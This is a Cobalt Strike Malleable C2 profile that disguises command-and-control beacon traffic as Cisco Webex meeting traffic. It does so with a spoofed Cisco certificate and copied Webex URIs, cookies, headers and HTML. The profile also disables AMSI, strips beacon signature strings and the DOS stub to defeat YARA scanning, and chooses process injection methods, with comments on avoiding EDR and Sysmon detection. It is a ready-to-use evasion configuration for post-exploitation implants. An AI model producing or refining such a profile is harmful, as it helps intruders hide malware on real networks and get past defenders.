# This will make your C2 look like webex traffic
#
# Author: @nullevent

# The default below is from SSL cert at https://meet1354.webex.com/wbxmjs/joinservice/...
    ## You should really use a cert signed by a trusted CA or create your own self signed cert and use keytool to import it
    ## The default below uses cobalt strike self-signed cert just as a base template for webex traffic

    ## Option 1) Trusted and Signed Certificate
    ## Use keytool to create a Java Keystore file.
    ## Refer to https://www.cobaltstrike.com/help-malleable-c2#validssl
    ## or https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/HTTPsC2DoneRight.sh

    ## Option 2) Create your own Self-Signed Certificate
    ## Use keytool to import your own self signed certificates

    #set keystore "/pathtokeystore";
    #set password "password";

    ## Option 3) Cobalt Strike Self-Signed Certificate - see below block:
https-certificate {
    set CN       "*webex.com";
    set O        "Cisco Systems Inc.";
    set C        "US";
    set L        "San Jose";
    set OU       "Cisco Systems Inc.";
    set ST       "CA";
    set validity "365";
}

set sleeptime "90000";
set jitter    "35";
# You should modify user agent to one used by a host in your target organization
set useragent "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";

################################################
## Post Exploitation
################################################

post-ex {
    # CHANGE ME
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    # CHANGE ME
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    # Change the permissions and content of post-ex DLLs
    set obfuscate "true";
    # Pass key function pointers from Beacon to its child jobs
    set smartinject "true";
    # Disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "true";
}

################################################
## SMB Beacon
################################################

# Do not use mojo chromium pipes unless you know your TID in advance - will not match the named pipe convention, easy detection...see no starch evading EDR book for more details

set pipename "crashpad_9##6_YLTDIJWBGVMRNSJQ";
set pipename_stager  "crashpad_73##_YLTDIJWBGVMRNSJQ";

################################################
## DNS Stuff
################################################

dns-beacon {
    # Google dns server - you should also customize this to your target's dns server
    set dns_idle "8.8.4.4";
    # Default value of 255 can raise flag in some places - keep in mind the lower the maxdns, the more dns traffic...
    set maxdns "235";
    # Sets max length of DNS TXT responses - default is 255
    set dns_max_txt "196";
    # Forces sleep prior to each individual DNS req (in ms)
    set dns_sleep "2";
}

################################################
## Staging
################################################

# You really do not want staged payloads...
set host_stage "false";

################################################
## Memory Opsec
################################################

stage {
    set userwx "false";
    set cleanup "true";
    set sleep_mask "true";
    set magic_mz_x86 "H@KC";
    set magic_mz_x64 "AYAQ";
    set magic_pe "NO";
    set obfuscate "true";
    set stomppe "true";
    # The transform rules below drastically cut down on YARA detections (tested via elastic) - advised to further test and modify the below:
    transform-x64 {
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        strrep "beacon.dll" "";
        strrep "This program cannot be run in DOS mode" "";
        strrep "(admin)" "(adm)";
        strrep "%s as %s\\%s: %d" "%s - %s\\%s: %d";
        # Modify default DOS stub:
        strrep "\x4D\x5A\x41\x52\x55\x48\x89\xE5\x48\x81\xEC\x20\x00\x00\x00\x48\x8D\x1D\xEA\xFF\xFF\xFF\x48\x89\xDF\x48\x81\xC3\xA4\x6E\x01\x00\xFF\xD3\x41\xB8\xF0\xB5\xA2\x56\x68\x04\x00\x00\x00\x5A\x48\x89\xF9\xFF\xD0" "\x4D\x5A\x48\x8D\x1D\xF8\xFF\xFF\xFF\x41\x52\x48\x83\xEC\x28\x48\x89\xDF\x48\x81\xC3\x52\xB7\x00\x00\x48\x81\xC3\x52\xB7\x00\x00\xFF\xD3\x48\xC7\xC2\x04\x00\x00\x00\x48\x89\xF9\xFF\xD0";
    }
}

################################################
## Process Injection Opsec
################################################

process-inject {

    # set a remote memory allocation technique: VirtualAllocEx|NtMapViewOfSection
    set allocator "NtMapViewOfSection";

    # Minimium memory allocation size when injecting content
    set min_alloc "17500";

    # Set memory permissions as permissions as initial=RWX, final=RX
    set startrwx "false";
    set userwx   "false";

    # Free BOF memory after execution
    set bof_reuse_memory "false";

    # Transform injected content to avoid signature detection of first few bytes. Only supports prepend and append.
    transform-x86 {
        prepend "\x90\x90\x90\x90";
        #append "\x90\x90\x90\x90";
    }

    transform-x64 {
        prepend "\x90\x90\x90\x90";
        #append "\x90\x90\x90\x90";
    }

    execute {

        # The order is important! Each step will be attempted (if applicable) until successful
        ## self-injection
        CreateThread "ntdll!RtlUserThreadStart+0x42";
        CreateThread;

        ## Injection via suspened processes (SetThreadContext|NtQueueApcThread-s)
        # OPSEC - when you use SetThreadContext; your thread will have a start address that reflects the original execution entry point of the temporary process.
        # SetThreadContext;
        NtQueueApcThread-s;

        ## Injection into existing processes
        # OPSEC Uses RWX stub - Detected by Get-InjectedThread. Less detected by some defensive products.
        #NtQueueApcThread;

        # CreateRemotThread - Vanilla cross process injection technique. Doesn't cross session boundaries
        # OPSEC - fires Sysmon Event 8
        CreateRemoteThread;

        # RtlCreateUserThread - Supports all architecture dependent corner cases (e.g., 32bit -> 64bit injection) AND injection across session boundaries
        # OPSEC - fires Sysmon Event 8. Uses Meterpreter implementation and RWX stub - Detected by Get-InjectedThread
        RtlCreateUserThread;
    }
}

################################################
## HTTP GET
################################################

http-get {

    set uri "/webappng/api/v1/meetings/4e04be2d39f145abab7f56bc20dd54d0";

    client {

        header "Host" "meet1354.webex.com";
        header "Accept" "application/json, text/plain, */*";
        header "Cookie" "amp_43702d_webex.com=gbJFzVF7JJvUF4LL1RL1dB...1hnm5u2lo.1hnm6ppqk.1.6.7";
        header "Cookie" "_hjSessionUser_1283126=eyJpZCI6Ijg0Y2MwZDJjLTU2ODgtNTc5N0=";
        header "Cookie" "origin_web=webex.com";
        header "Cookie" "CK_CDNHostStatus=akamaicdn.webex.com|1709068156759|1";

        metadata {
            netbiosu;
            prepend "JSESSIONID=";
            header "Cookie";
        }

        parameter "appendGlobalCallinNumbers" "false";
        parameter "pms" "0";
        parameter "siteurl" "meet1354";


    }

    server {

        header "Cache-Control" "no-cache, no-store";
        header "Content-Type" "application/json";
        header "Vary" "Access-Control-Request-Method";
        header "Content-Security-Policy" "script-src 'self' nebular.webex.com bmmp.webex.com akamaicdn.webex.com cdn.appdynamics.com cdn.appdynamics.com *.webex.com *.vbrickrev.com *.vbrick.com blob: *.amplitude.com;frame-src 'self' nebular.webex.com blob:  *.webex.com *.webex.com.cn *.voicea.com mailto: webexstart;default-src 'self' ;child-src 'self' blob:";
        header "wbx3" "1";
        header "Connection" "close";


        output {
            netbios;
            prepend "<!-- BMMP Widget for Upgrade in Top Menu Bar - Start -->";
            prepend "\n";
            prepend "<!-- BMMP Widget for Upgrade in Top Menu Bar - End -->";
            prepend "\n";
            prepend "<!DOCTYPE html>";
            prepend "<html lang=\"en-US\">";
            prepend "<head>\n";
            prepend "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=10, requiresActiveX=true\"/>\n";
            prepend "<meta name='robots' content='noindex,nofollow'>\n";
            prepend "<meta http-equiv=\"content-type]\" content=\"text/html; charset=UTF-8\">\n";
            prepend "<title>\n";
            prepend "My Webex\n";
            prepend "</title>\n";
            prepend "<link rel=\"stylesheet\" href=\"https&#58;&#47;&#47;meet1354.webex.com&#47;svc3300&#47;svccomponents&#47;html&#47;css&#47;futurama.css&#63;ver&#61;1038222573\" type=\"text/css\">\n";
            prepend "<script type=\"text/javascript\">\n";
            prepend "\n";
            prepend "\n";
            prepend "WbxJquery(setTimeout(function(){";
            prepend "\n";
            prepend "if (typeof(TrainWarmUpAPI)!=\"undefined\") {";
            prepend "\n";
            prepend "\n";
            prepend "TrainWarmUpAPI.init(";
            append ")";
            append "</script>\n";
            append "<!--TopMenu End -->";
            append "\n";
            append "</head>";
            append "\n";
            append "</html>";
            print;
        }
    }

}

################################################
## HTTP POST
################################################

http-post {
    # Reminder - you must make the URI distinct from the c2 http-get URI - capitalized "v" in V1 below:
    set uri "/webappng/api/V1/meetings/4e04be2d39f145abab7f56bc20dd54d0";
    set verb "GET";

    client {

        header "Host" "meet1354.webex.com";
        header "Accept" "application/json, text/plain, */*";
        header "Cookie" "amp_43702d_webex.com=gbJFzVF7JJvUF...1m5u2lo.1hn6pqk.1.6.7";
        header "Cookie" "_hjSessionUser_1283126=eyJpZCI6Ijg0YwZDJj2ODgtNT9cs284dnks02027cvQzc5Ni1YyLT0YzYWxzZX0=";
        header "Cookie" "origin_web=webex.com";
        header "Cookie" "CK_CDNHostStatus=akamaicdn.webex.com|170906859|1";

        output {
            # This was previously stored in JSESSIONID - this will be too suspicious/long in POST request so moved it to very long AMP_ cookie value
            netbios;
            prepend "AMP_43702d64a7=";
            header "Cookie";
        }

        id {
            # The "pms" parameter was previously hardcoded in the http-get section - use this to send session ID
            netbios;
            parameter "_pms";
        }

        parameter "appendGlobalCallinNumbers" "false";
        parameter "pms" "0";
        parameter "siteurl" "meet1354";


    }
    # We mirror the server config from http-get block for traffic consistency
    server {

        header "Cache-Control" "no-cache, no-store";
        header "Content-Type" "application/json";
        header "Vary" "Access-Control-Request-Method";
        header "Content-Security-Policy" "script-src 'self' nebular.webex.com bmmp.webex.com akamaicdn.webex.com cdn.appdynamics.com cdn.appdynamics.com *.webex.com *.vbrickrev.com *.vbrick.com blob: *.amplitude.com;frame-src 'self' nebular.webex.com blob:  *.webex.com *.webex.com.cn *.voicea.com mailto: webexstart;default-src 'self' ;child-src 'self' blob:";
        header "wbx3" "1";
        header "Connection" "close";


        output {
            netbios;
            prepend "<!-- BMMP Widget for Upgrade in Top Menu Bar - Start -->";
            prepend "\n";
            prepend "<!-- BMMP Widget for Upgrade in Top Menu Bar - End -->";
            prepend "\n";
            prepend "<!DOCTYPE html>";
            prepend "<html lang=\"en-US\">";
            prepend "<head>\n";
            prepend "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=10, requiresActiveX=true\"/>\n";
            prepend "<meta name='robots' content='noindex,nofollow'>\n";
            prepend "<meta http-equiv=\"content-type]\" content=\"text/html; charset=UTF-8\">\n";
            prepend "<title>\n";
            prepend "My Webex\n";
            prepend "</title>\n";
            prepend "<link rel=\"stylesheet\" href=\"https&#58;&#47;&#47;meet1354.webex.com&#47;svc3300&#47;svccomponents&#47;html&#47;css&#47;futurama.css&#63;ver&#61;1038222573\" type=\"text/css\">\n";
            prepend "<script type=\"text/javascript\">\n";
            prepend "\n";
            prepend "\n";
            prepend "WbxJquery(setTimeout(function(){";
            prepend "\n";
            prepend "if (typeof(TrainWarmUpAPI)!=\"undefined\") {";
            prepend "\n";
            prepend "\n";
            prepend "TrainWarmUpAPI.init(";
            append ")";
            append "</script>\n";
            append "<!--TopMenu End -->";
            append "\n";
            append "</head>";
            append "\n";
            append "</html>";
            print;
        }
    }
}
